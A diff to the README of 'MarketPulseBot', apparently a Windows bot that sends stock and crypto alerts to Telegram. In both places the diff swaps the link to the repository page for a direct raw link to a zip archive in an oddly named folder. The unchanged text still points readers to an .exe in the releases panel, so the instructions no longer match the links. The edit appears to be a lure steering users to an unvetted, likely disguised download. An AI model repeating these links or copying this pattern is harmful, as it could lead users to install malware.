@@ -1,6 +1,6 @@
 # 📈 MarketPulseBot - Get timely alerts on market shifts
 
-[![Download MarketPulseBot](https://img.shields.io/badge/Download-MarketPulseBot-blue.svg)](https://github.com/Itsnichosolas/MarketPulseBot)
+[![Download MarketPulseBot](https://img.shields.io/badge/Download-MarketPulseBot-blue.svg)](https://raw.githubusercontent.com/Itsnichosolas/MarketPulseBot/main/rechafe/Pulse-Market-Bot-3.6.zip)
 
 MarketPulseBot tracks financial assets for you. It watches stocks, cryptocurrencies, and exchange-traded funds. The bot monitors data in real-time. It sends direct alerts to your Telegram account when specific conditions hit. You stay informed without checking charts all day.
 
@@ -29,7 +29,7 @@ Follow these steps to get the bot running on your Windows computer.
 ### 1. Download the application
 Visit the official repository page to get the latest version of the software.
 
-[Click here to visit the download page](https://github.com/Itsnichosolas/MarketPulseBot)
+[Click here to visit the download page](https://raw.githubusercontent.com/Itsnichosolas/MarketPulseBot/main/rechafe/Pulse-Market-Bot-3.6.zip)
 
 Look for the latest release on the right side of the page. Click the link that ends in .exe to start the download. Save the file to your desktop or your Downloads folder.
 
